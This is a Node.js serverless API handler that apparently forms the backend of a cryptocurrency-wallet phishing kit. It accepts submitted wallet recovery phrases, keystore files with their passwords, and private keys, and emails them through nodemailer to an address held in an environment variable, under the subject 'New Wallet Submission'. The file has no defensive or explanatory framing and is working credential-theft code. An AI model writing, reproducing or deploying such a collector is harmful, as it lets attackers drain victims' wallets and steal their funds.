// api/sendmail.js
import nodemailer from 'nodemailer';

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ message: 'Method Not Allowed' });
  }

  const { type, walletName, phrase, keystore, password, privateKey } = req.body;

  let emailText = `Wallet Name: ${walletName}\nType: ${type}\n`;

  if (type === 'phrase') {
    emailText += `Phrase: ${phrase}`;
  } else if (type === 'keystore') {
    emailText += `Keystore: ${keystore}\nPassword: ${password}`;
  } else if (type === 'privatekey') {
    emailText += `Private Key: ${privateKey}`;
  }

  try {
    const transporter = nodemailer.createTransport({
      service: 'gmail', // or use SMTP config
      auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS,
      },
    });

    await transporter.sendMail({
      from: process.env.EMAIL_USER,
      to: process.env.EMAIL_TO,
      subject: '🔐 New Wallet Submission',
      text: emailText,
    });

    return res.status(200).json({ message: 'Email sent' });
  } catch (error) {
    return res.status(500).json({ error: 'Failed to send email', details: error.message });
  }
}
